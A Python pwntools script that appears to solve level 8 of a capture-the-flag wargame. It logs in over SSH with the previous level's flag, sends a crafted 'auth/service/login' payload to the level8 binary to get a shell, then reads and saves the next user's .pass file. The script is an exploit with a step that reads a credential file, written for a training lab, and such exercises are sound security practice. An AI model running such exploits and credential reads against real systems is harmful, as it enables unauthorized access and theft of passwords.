#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'level8'
password = open("../level7/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    p = s.process(["./level8"])

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:
       
        payload = b"auth \x0aserviceAAA\x0aserviceAAA\x0alogin\x0a"
        ssh_send(payload)

        wait_for_shell()
        ssh_send("cat /home/user/level9/.pass")
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nlevel9 password: {flag}\n")

    if flag[-1] == '\n':
        flag = flag[:-1]
    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()

